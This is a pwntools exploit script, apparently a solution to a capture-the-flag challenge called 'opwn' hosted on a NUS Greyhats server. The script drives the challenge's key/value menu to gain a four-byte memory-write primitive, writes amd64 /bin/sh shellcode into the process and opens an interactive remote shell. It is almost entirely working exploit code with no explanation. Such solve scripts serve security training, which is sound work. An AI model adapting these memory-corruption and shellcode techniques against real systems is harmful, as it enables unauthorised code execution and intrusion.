from pwn import *

#r = process('dist/opwn.o')
r = remote('challs1.nusgreyhats.org', 5005)
def insert(k, v):
    r.recvuntil(b"Option: ")
    r.sendline(b"1")
    r.recvuntil(b"Key: ")
    r.sendline(str(k).encode('utf-8'))
    r.recvuntil(b"Value: ")
    r.sendline(str(v).encode('utf-8'))

def lookup(k):
    r.recvuntil("Option: ")
    r.sendline(b"2")
    r.recvuntil("Key: ")
    r.sendline(str(k).encode('utf-8'))

def delete(i):
    r.recvuntil("Option: ")
    r.sendline(b"3")
    r.recvuntil("Index: ")
    r.sendline(str(i).encode('utf-8'))


insert(1, 1)
asmcode = u64(asm("shr rdi, 32; mov [rdi], eax", arch="amd64").rjust(8,b"\x90"))
insert(asmcode, asmcode)
inv = 5675921253449092805 #inverse_mod(13,2**64)
delete(inv)
def write4(addr, val):
    val = val.ljust(4, b"\x00")
    val = u32(val)
    lookup((addr << 32) | val)


shellcode = asm(shellcraft.amd64.linux.sh() + "ret;", arch="amd64")
for i in range(0, len(shellcode), 4):
    write4(0x133703e + 4 + i, shellcode[i:i+4])

write4(0x133703e, b"\x90\x90\x90\x90")
r.interactive()